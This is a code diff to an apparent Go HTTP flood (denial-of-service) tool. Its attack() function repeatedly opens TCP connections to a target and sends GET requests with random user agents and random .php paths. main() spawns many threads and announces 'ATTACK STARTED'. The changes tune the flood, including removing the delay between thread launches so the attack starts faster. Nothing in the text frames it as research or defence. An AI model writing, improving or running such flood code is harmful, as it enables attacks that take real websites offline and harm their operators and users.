@@ -86,7 +86,7 @@ func useragent() string {
 
 func getheader() string {
 	connection := "Connection: keep-alive\r\n"
-	referer := "Referer: " + "https://" + ip + "\r\n"
+	referer := "Referer: " + "https://" + ip + "/" + "\r\n"
 	accept := acceptall[rand.Intn(len(acceptall))]
 	useragent := "User-Agent: " + useragent() + "\r\n"
 	header := connection + useragent + accept + referer + "\r\n"
@@ -96,13 +96,13 @@ func getheader() string {
 func attack() {
 	var s net.Conn
 	var err error
+	addr := ip + ":" + port
 	<-start
 	for {
 		header := getheader()
 		if rpath == true {
 			path = "/" + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + ".php"
 		}
-		addr := ip + ":" + port
 		get_host := "GET " + path + " HTTP/1.1\r\nHost: " + addr + "\r\n"
 		request := get_host + header
 		s, err = net.Dial("tcp", addr)
@@ -145,7 +145,6 @@ func main() {
 		fmt.Println("Runtime should be a integer")
 	}
 	for i := 0; i < threads; i++ {
-		time.Sleep(time.Microsecond * 100)
 		go attack()
 	}
 	fmt.Println("ATTACK STARTED WITH", threads, "THREADS\r\nATTACK WILL END AT", runtimes, "SECONDS")
